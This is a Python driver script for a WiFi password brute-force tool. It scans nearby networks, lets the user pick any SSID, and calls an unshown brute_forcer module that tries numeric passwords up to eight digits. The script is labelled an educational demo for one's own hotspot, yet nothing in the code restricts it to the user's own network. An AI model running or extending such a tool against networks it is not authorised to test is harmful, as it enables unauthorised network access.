from wifi_scanner import list_wifi_networks, select_network
from brute_forcer import brute_force_wifi
import logging

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def main():
    print("WiFi Password Cracker (Educational Demo)")
    print("======================================")
    print("This script is for cracking your own mobile hotspot password.")
    print("Ensure you have permission and run with administrator privileges.")
    print("======================================\n")
    
    ssids = list_wifi_networks()
    if not ssids:
        print("No networks available. Exiting.")
        return
    
    target_ssid = select_network(ssids)
    print(f"Selected WiFi: {target_ssid}\n")
    
    # charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    charset = "0123456789"
    max_length = 8
    
    print(f"Starting brute force attack on {target_ssid}...")
    print(f"Using charset: {charset}")
    print(f"Max password length: {max_length}")
    
    password, attempts, duration = brute_force_wifi(target_ssid, charset, max_length)
    
    print("\n======================================")
    if password:
        print(f"Success! Password found: {password}")
        print(f"Number of combinations tried: {attempts}")
        print(f"Time taken: {duration:.2f} seconds")
    else:
        print("Password not found within the given constraints.")
        print(f"Total combinations tried: {attempts}")
        print(f"Time taken: {duration:.2f} seconds")
    print("======================================")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nBrute force interrupted by user.")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        print("An error occurred. Check logs for details.")